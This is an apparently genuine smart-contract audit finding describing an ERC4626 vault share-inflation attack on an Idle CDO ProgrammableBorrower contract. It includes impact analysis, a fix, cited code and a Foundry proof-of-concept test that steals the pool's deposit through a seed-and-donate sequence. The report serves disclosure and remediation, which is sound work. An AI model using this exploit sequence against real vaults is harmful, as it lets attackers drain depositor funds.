### Title
Unvalidated ERC4626 share minting lets a vault depositor steal programmable-borrower funds - ([File: contracts/strategies/idle/ProgrammableBorrower.sol](contracts/strategies/idle/ProgrammableBorrower.sol))

### Summary
`ProgrammableBorrower` accepts any ERC4626 vault with a matching asset and deposits all idle pool funds without enforcing a minimum number of received shares. [1](#0-0) [2](#0-1)  An unprivileged vault user can inflate the vault’s asset-per-share rate before `startEpoch`, causing the programmable borrower to receive zero or dust shares for the pool’s deposit while the attacker retains the shares needed to redeem the underlying.

### Finding Description
Programmable-borrower mode requires minted-interest accounting, and `startEpoch` sends the pool’s available underlying to the configured programmable borrower before invoking `onStartEpoch`. [3](#0-2) [4](#0-3) 

`onStartEpoch` snapshots the borrower’s current cash and vault value, then deposits its entire underlying balance into the configured ERC4626 vault. [5](#0-4)  `_depositToVault` accepts the returned share amount without a minimum-share check, slippage bound, vault-supply sanity check, or verification that the new shares represent approximately the deposited assets. [2](#0-1) 

An attacker who is merely an ordinary user of the ERC4626 vault can first seed it with one share and donate a large amount of underlying to the vault. When `ProgrammableBorrower` subsequently deposits `P` underlying, a vault using `assets * totalSupply / totalAssets` share math can mint zero shares when the pre-deposit asset balance exceeds `P`. The attacker then redeems their single share for the donated assets plus the pool’s `P` underlying.

The resulting vault position is valued through `vault.convertToAssets(vault.balanceOf(address(this)))`, so the protocol sees that the programmable borrower has no remaining vault value. [6](#0-5)  `_vaultNetInterest` records the missing principal as a vault loss, but `totalInterestDueNow` clamps negative results to zero; it does not propagate a principal reduction to the CDO. [7](#0-6) 

### Impact Explanation
This breaks solvency and fair mint/burn accounting. With a zero-share ERC4626 implementation, an attacker can steal the entire programmable-borrower deposit. For example, if the pool sends `10,000 USDC`, the attacker seeds the vault with `1 USDC`, donates `20,000 USDC`, causes the borrower to receive zero shares, and redeems the sole share for approximately `30,001 USDC`, extracting the pool’s `10,000 USDC`.

The loss is worse than a normal realized yield loss because the CDO continues holding the same amount of strategy tokens and a successful ordinary stop can report zero interest rather than immediately reducing tranche NAV. The missing collateral therefore remains masked until withdrawals or pool closure require actual cash. [8](#0-7) 

### Likelihood Explanation
The attack does not require the borrower, manager, owner, or vault administrator to be malicious; the attacker only needs to deposit into and donate to the ERC4626 vault. It is most practical when the configured vault is newly deployed, has a very small share supply, or otherwise lacks inflation-protection mechanisms such as virtual shares and assets.

The risk is limited by vault selection: major ERC4626 vaults may already use supply offsets, minimum initial deposits, or share-minting checks. However, `setVault` permits any ERC4626-compatible vault matching the underlying asset, and the contract does not enforce the economic equivalence of the returned shares. [1](#0-0) 

### Recommendation
Validate every ERC4626 deposit by requiring a nonzero returned share amount and a minimum acceptable asset value after the deposit. For example:

```solidity
uint256 shares = vault.deposit(_assetAmount, address(this));
uint256 assetsReceived = vault.convertToAssets(shares);
if (shares == 0 || assetsReceived < _assetAmount - maxDepositSlippage) {
    revert InvalidAmount();
}
```

The protocol should also restrict approved vaults to implementations with ERC4626 inflation protection and monitor vault `totalSupply`/share-price anomalies before epoch starts.

### Proof of Concept
The following Foundry test can be added to `test/foundry/ProgrammableBorrowerCreditVault.t.sol`. It uses the file’s existing `MockStopEpochLiquidityVault`, which mints shares as `assets * totalSupply / assetsBefore` and therefore permits a zero-share deposit.

```solidity
function testPocERC4626InflationStealsEpochDeposit() external {
    _setUpProgrammableBorrowerCreditVault(FORK_BLOCK, STEAKHOUSE_USDC);

    MockStopEpochLiquidityVault vulnerableVault =
        new MockStopEpochLiquidityVault(USDC);

    address attacker = makeAddr("vaultAttacker");
    uint256 poolDeposit = 10_000 * oneScale;
    uint256 attackerSeed = 1;
    uint256 attackerDonation = 20_000 * oneScale;

    // Honest configuration: switch before any epoch or vault position exists.
    vm.prank(manager);
    programmableBorrower.setVault(address(vulnerableVault));

    // Ordinary ERC4626 user inflates asset-per-share before the pool deposit.
    deal(USDC, attacker, attackerSeed + attackerDonation, true);
    vm.startPrank(attacker);
    underlying.approve(address(vulnerableVault), attackerSeed);
    vulnerableVault.deposit(attackerSeed, attacker);
    underlying.transfer(address(vulnerableVault), attackerDonation);
    vm.stopPrank();

    // LP deposits and the honest manager starts the epoch.
    vm.prank(owner);
    cdoEpoch.setIsInterestMinted(true);
    idleCDO.depositAA(poolDeposit);

    vm.prank(manager);
    cdoEpoch.startEpoch();

    // The programmable borrower deposited poolDeposit but received zero shares.
    assertEq(underlying.balanceOf(address(programmableBorrower)), 0);
    assertEq(vulnerableVault.balanceOf(address(programmableBorrower)), 0);

    // The attacker owns the only share and redeems all vault assets.
    uint256 attackerBefore = underlying.balanceOf(attacker);
    vm.prank(attacker);
    vulnerableVault.redeem(
        vulnerableVault.balanceOf(attacker),
        attacker,
        attacker
    );

    uint256 attackerAfter = underlying.balanceOf(attacker);
    assertEq(
        attackerAfter,
        attackerBefore + attackerSeed + attackerDonation + poolDeposit
    );

    // Epoch accounting recognizes the missing vault assets only as clamped
    // interest loss; the CDO's strategy-token NAV remains unchanged.
    vm.warp(cdoEpoch.epochEndDate() + 1);
    assertEq(programmableBorrower.totalInterestDueNow(), 0);

    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);

    assertEq(cdoEpoch.lastEpochInterest(), 0);
    assertApproxEqAbs(
        cdoEpoch.getContractValue(),
        poolDeposit,
        2,
        "CDO NAV remains backed by an empty programmable borrower"
    );
}
```

### Citations

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L158-168)
```text
  function setVault(address _vault) external {
    _checkOnlyOwnerOrManager();
    if (_vault == address(0) || IERC4626(_vault).asset() != address(underlyingToken)) {
      revert InvalidAddress();
    }
    // Switching the accounting source is only safe once the current epoch is fully settled and the
    // old vault position has been unwound.
    if (epochAccountingActive || vault.balanceOf(address(this)) != 0) revert NotAllowed();
    underlyingToken.safeApprove(address(vault), 0);
    vault = IERC4626(_vault);
    _allowUnlimitedSpend(address(underlyingToken), _vault);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L201-219)
```text
  function onStartEpoch(uint256 _pendingWithdraws) external nonReentrant {
    _checkOnlyIdleCDO();
    _accrueBorrowerInterest();
    // Reserve the amount IdleCDO expects to pull back at stopEpoch before the real borrower can draw again.
    epochPendingWithdraws = _pendingWithdraws;
    uint256 currentVaultAssets = _currentVaultAssets();
    uint256 bufferStartAssets = bufferStartVaultAssets;
    // Carry vault PnL generated while the pool was in the buffer into the new active epoch so it
    // is eventually realized in tranche prices at the next stopEpoch.
    bufferedVaultDelta = int256(currentVaultAssets) - int256(bufferStartAssets);
    bufferStartVaultAssets = 0;
    // Snapshot total assets before re-depositing idle cash so the epoch principal baseline uses the
    // exact pre-deposit amount instead of a post-deposit share-conversion round-down.
    uint256 startAssets = underlyingToken.balanceOf(address(this)) + currentVaultAssets;
    // Any idle balance left on the contract between epochs is parked immediately into the vault.
    _depositToVault(underlyingToken.balanceOf(address(this)), 0);
    // Reset the epoch accounting baseline from the exact pre-start total assets so the new epoch
    // does not treat the just-deposited idle balance as fresh vault profit or loss.
    epochStartVaultAssets = startAssets;
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L330-345)
```text
  function totalInterestDueNow() external view returns (uint256) {
    (uint256 vaultInterest, uint256 loss) = _vaultNetInterest();
    uint256 totalGain = vaultInterest + borrowerInterestAccruedNow() + bufferInterest;
    return totalGain > loss ? totalGain - loss : 0;
  }

  /// @notice Compute the net vault delta split into interest and loss (mutually exclusive).
  function _vaultNetInterest() internal view returns (uint256 interest, uint256 loss) {
    if (!epochAccountingActive) return (0, 0);
    uint256 earnedAssets = _currentVaultAssets() + epochWithdrawnFromVault;
    uint256 principalAssets = epochStartVaultAssets + epochDepositedToVault;
    int256 netDelta = bufferedVaultDelta + int256(earnedAssets) - int256(principalAssets);
    if (netDelta > 0) {
      interest = uint256(netDelta);
    } else {
      loss = uint256(-netDelta);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L378-384)
```text
  function _depositToVault(uint256 _assetAmount, uint256 _principalAssets) internal {
    if (_assetAmount == 0) return;
    uint256 shares = vault.deposit(_assetAmount, address(this));
    if (epochAccountingActive && _principalAssets != 0) {
      epochDepositedToVault += _principalAssets;
    }
    emit DepositedIntoVault(_assetAmount, shares);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L546-549)
```text
  function _currentVaultAssets() internal view returns (uint256) {
    uint256 shares = vault.balanceOf(address(this));
    return shares == 0 ? 0 : vault.convertToAssets(shares);
  }
```

**File:** contracts/IdleCDOEpochVariant.sol (L103-107)
```text
  /// @notice Ensure programmable borrowers are only used with minted-interest accounting.
  /// @dev Programmable borrower flows assume minted interest and do not support instant funding.
  function _checkProgrammableBorrowerMode() internal view {
    _checkNotAllowed(isProgrammableBorrower && (!isInterestMinted || _pendingInstant() != 0));
  }
```

**File:** contracts/IdleCDOEpochVariant.sol (L270-303)
```text
    // transfer in this contract funds from interest payment (if any) and buffer deposits sent to the strategy
    uint256 _totEpochDeposits = _strategy.totEpochDeposits();
    // If interest is minted we do not transfer interest to the strategy
    uint256 _toSend = isInterestMinted ? _totEpochDeposits : lastEpochInterest + _totEpochDeposits;
    _strategy.sendInterestAndDeposits(_toSend);

    // we should first check if there are *instant* redeem requests pending 
    // and if yes we should send as much underlyings as possible to the IdleCreditVault contract
    // if there is any surplus then we send those to the borrower
    uint256 pendingInstant = _pendingInstant();
    uint256 totUnderlyings = _contractTokenBalance(token);
    uint256 _pendingWithdraws = _strategy.pendingWithdraws();
    _strategy.collectInstantWithdrawFunds(pendingInstant > totUnderlyings ? totUnderlyings : pendingInstant);

    // if there are more requests than the current underlyings we simply send all underlyings
    // to the IdleCreditVault contract
    if (pendingInstant > totUnderlyings) {
      // if borrower is programmable, notify epoch start even if no funds were sent
      _startEpochProgrammableBorrower(_pendingWithdraws);
      return;
    }
    // allow instant withdraws right away without waiting for the deadline
    allowInstantWithdraw = true;
    // and transfer the surplus to the borrower
    uint256 _toBorrower = totUnderlyings - pendingInstant;
    try this.sendFundsToBorrower(_toBorrower) {
      // funds transferred correctly
      _startEpochProgrammableBorrower(_pendingWithdraws);
    } catch {
      // The borrower did not receive the funds, so keep the strategy-token backing in the strategy.
      _transferUnderlyings(address(_strategy), _toBorrower);
      _strategy.reserveDefaultRecovery(_toBorrower);
      _handleBorrowerDefault(_toBorrower);
    }
```

**File:** contracts/IdleCDOEpochVariant.sol (L406-436)
```text
    // accrue interest to idleCDO, this will increase tranche prices.
    // Send also tot withdraw requests amount to the IdleCreditVault contract
    try this.getFundsFromBorrower(_amountToPullFromBorrower + _pendingWithdraws) {
      // transfer in strategy and decrease pendingWithdraws
        _strategy.collectWithdrawFunds(_pendingWithdraws);
      // Only settle borrower interest when CDO is fronting it (minted mode, not closing pool).
      // When requesting all funds (_interest == 1) the CDO pulls cash directly, no fronting.
      if (_mintInterest && isProgrammableBorrower) {
        IProgrammableBorrower(_borrower()).settleBorrowerInterest();
      }
      // Split pending withdraw fees before update accounting
      // NOTE: Fees are sent with 2 different transfer calls, here and after updateAccounting, to avoid complicated calculations
      if (!_mintInterest) {
        _transferFeeUnderlyings(_pendingWithdrawFees);
      }

      if (_isRequestingAllFunds) {
        // we already have strategyTokens equal to _totBorrowed in this contract
        // so we transfer _totBorrowed to the strategy to avoid double counting for getContractValue
        _transferUnderlyings(address(_strategy), _totBorrowed);
      }

      if (_mintInterest) {
        // if interest is not transferred we mint strategy tokens equal to the full epoch interest
        if (_grossInterest != 0) _strategy.mintStrategyTokens(_grossInterest);
        // and increase unclaimedFees by pending withdraw fees before _updateAccounting
        unclaimedFees += _pendingWithdrawFees;
      }

      // update tranche prices and unclaimed fees
      _updateAccounting();
```
